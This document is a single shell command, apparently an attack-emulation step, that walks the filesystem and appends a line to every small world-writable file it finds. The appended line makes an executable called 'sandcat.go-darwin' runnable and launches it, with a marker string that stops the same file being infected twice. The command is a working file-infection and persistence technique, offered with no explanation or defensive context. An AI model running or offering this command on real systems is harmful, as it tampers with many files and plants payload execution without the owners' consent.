find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-darwin && sandcat.go-darwin" >> "{}"; ls "{}" ' \; | echo "complete"
